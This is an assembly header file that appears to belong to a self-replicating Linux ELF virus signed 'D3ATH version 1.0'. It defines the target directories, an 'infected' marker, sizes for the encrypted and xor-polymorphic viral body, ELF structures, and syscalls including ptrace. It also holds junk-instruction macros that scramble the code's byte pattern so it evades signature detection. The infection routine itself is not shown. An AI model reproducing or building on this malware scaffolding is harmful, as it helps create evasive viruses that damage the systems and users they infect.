%ifndef HEADER_ASM
 %define HEADER_ASM

%define FOLDER_1 "/tmp/test/"
%strlen F1_LEN FOLDER_1

%define FOLDER_2 "/tmp/test2/"
%strlen F2_LEN FOLDER_2

%define TMP "infected"
%strlen TMP_LEN TMP

%define FILE_SIZE 256 ; target
%define DIRENT 32768  ; buffer for getdents
%define FSTAT 144     ; buffer for fstat
%define ENTRY 16      ; new entry + opcode
%define MAPPED_FILE 8 ; mmap

;hash 
%define FNV_PRIME_64 1099511628211
%define FNV_OFFSET_64 0xcbf29ce484222325

;v_size
%define FAMINE_SIZE _v_stop - _war
;v_encrypt
%define CHUNKS_SIZE _v_stop - obfu
; xorpoly
%define XOR_POLY _v_stop - xorpoly
%define XOR_RJ0 _v_stop - RJ0
%define XOR_RJ1 _v_stop - RJ1
%define XOR_RJ2 _v_stop - RJ2
%define XOR_RJ4 _v_stop - RJ4


; ELF_HDR_DEFINITION
%define ET_EXEC 0x02
%define ET_DYN 0x03

; ELF_PHDR_DEFINITION
%define PT_LOAD 0x1
%define PF_X    0x1
%define PF_W    0x2
%define PF_R    0x4

;SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_FSTAT 5
%define SYS_MUNMAP 11
%define SYS_EXIT 60
%define SYS_RENAME 82
%define SYS_PTRACE 101
%define SYS_GETDENTS 217

;STARTING JUNK
;      EAX ECX EDX EBX ESP EBP ESI EDI
;  EAX C0  C8  D0  D8  E0  E8  F0  F8
;  ECX C1  C9  D1  D9  E1  E9  F1  F9
;  EDX C2  CA  D2  DA  E2  EA  F2  FA
;  EBX C3  CB  D3  DB  E3  EB  F3  FB
;  ESP C4  CC  D4  DC  E4  EC  F4  FC
;  EBP C5  CD  D5  DD  E5  ED  F5  FD
;  ESI C6  CE  D6  DE  E6  EE  F6  FE
;  EDI C7  CF  D7  DF  E7  EF  F7  FF

;http://ref.x86asm.net/coder64.html

%define PUSH_RAX 0x50
%define PUSH_RSI 0x57
%define POP_RAX 0x58
%define POP_RSI 0x5f
;CMP JUNK
; push <reg>, 1.2.3.4.5.6.7
%define PUSH_REG 0x50
; pop <reg> 1.2.3.4.5.6.7
%define POP_REG 0x58
; REX.W xchg rax, rax = NOP
;REX.W + flag + opcode 0x87 + r64 to avoid the use of 0x90:
;REX.W + 0x90 + r64 == XCHG RAX, r64 which is 0x90
%define NOP_0    0x48
%define NOP_1    0x87
%define NOP_2    0xC0

; %define JUNK_INIT PUSH_RAX, PUSH_RSI, NOP_0, NOP_1, NOP_2, POP_RSI, POP_RAX
%macro W_JUNK 0
    db PUSH_RAX, PUSH_RSI, NOP_0, NOP_1, NOP_2, NOP_0, NOP_1, NOP_2, POP_RSI, POP_RAX
%endmacro

%define SIGNATURE "D3ATH version 1.0 (c)oded by dbaffier - AAAABBBB"
%strlen SIG_LEN SIGNATURE

%define VAR_LEN F1_LEN + F2_LEN + TMP_LEN + SIG_LEN + 3

%define PAGE_SIZE 4096

%macro PAGE_ALIGN 1
    mov rcx, %1
    mov rdi, PAGE_SIZE
    dec rdi
    not rdi
    and rcx, rdi
    add rcx, PAGE_SIZE
%endmacro

; This memset need to be optimized
%macro memset 2
    .memset:
        lea rdi, %1
        add rdi, %2
        dec %2
        mov byte [rdi], byte 0
        cmp %2, 0
        jge .memset
%endmacro

%macro write 3
    mov rdi, %1
    mov rsi, %2
    mov rdx, %3
    mov rax, SYS_WRITE
    syscall
%endmacro

%macro write_rel 3
    mov rdi, %1
    lea rsi, %2
    mov rdx, %3
    mov rax, SYS_WRITE
    syscall
%endmacro    

struc LDIRENT_64
    .d_ino:          resq 1
    .d_off:          resq 1
    .d_reclen:       resw 1
    .d_type:         resb 1
    .d_name:         resb 1
endstruc

struc Elf64_Ehdr
    .e_ident:            resb 16
    .e_type:             resw 1
    .e_machine:          resw 1
    .e_version:          resd 1
    .e_entry:            resq 1
    .e_phoff:            resq 1
    .e_shoff:            resq 1
    .e_flags:            resd 1
    .e_ehsize:           resw 1
    .e_phentsize:        resw 1
    .e_phnum:            resw 1
    .e_shentsize:        resw 1
    .e_shnum:            resw 1
    .e_shstrndx:         resw 1
endstruc

struc phdr64
    .p_type:             resd 1
    .p_flags:            resd 1
    .p_offset:           resq 1
    .p_vaddr:            resq 1
    .p_paddr:            resq 1
    .p_filesz:           resq 1
    .p_memsz:            resq 1
    .p_align:            resq 1
endstruc

struc shdr64
    .sh_name:            resd 1
    .sh_type:            resd 1
    .sh_flags:           resq 1
    .sh_addr:            resq 1
    .sh_offset:          resq 1
    .sh_size:            resq 1
    .sh_link:            resd 1
    .sh_info:            resd 1
    .sh_addralign:       resq 1
    .sh_entsize:         resq 1
endstruc

; DB allocates in chunks of 1 byte.
; DW allocates in chunks of 2 bytes.
; DD allocates in chunks of 4 bytes.
; DQ allocates in chunks of 8 bytes.

; RESB 1 allocates 1 byte.
; RESW 1 allocates 2 bytes.
; RESD 1 allocates 4 bytes.
; RESQ 1 allocates 8 bytes.
%macro PUSH 0
    push rax
    push rbx
    W_JUNK
    push rcx
    W_JUNK
    push rdx
    W_JUNK
    push rsi
    push rdi
    push rbp
    W_JUNK
    push rsp
    push r8
    W_JUNK
    push r9
    push r10
    W_JUNK
    push r11
    push r12
    push r13
    push r14
    push r15
%endmacro

%macro POP 0
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rsp
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
%endmacro
%endif
